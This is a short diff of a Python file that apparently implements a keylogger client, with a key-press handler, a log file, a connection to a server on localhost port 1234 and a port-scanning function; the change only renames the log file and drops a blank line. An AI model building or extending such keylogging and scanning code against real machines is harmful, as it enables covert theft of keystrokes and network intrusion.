@@ -7,7 +7,7 @@ import io
 
 ip_address = '127.0.0.1'
 port_number = 1234
-keylog_file = "keylog_client.txt"
+keylog_file = "keylog.txt"
 
 def start_keylogger():
     def on_press(key):
@@ -98,7 +98,6 @@ def connect_to_server():
     cs.close()
 
 def scan_ports(start_port, end_port):
-
     open_ports = []
     for port in range(start_port, end_port + 1):
         try:
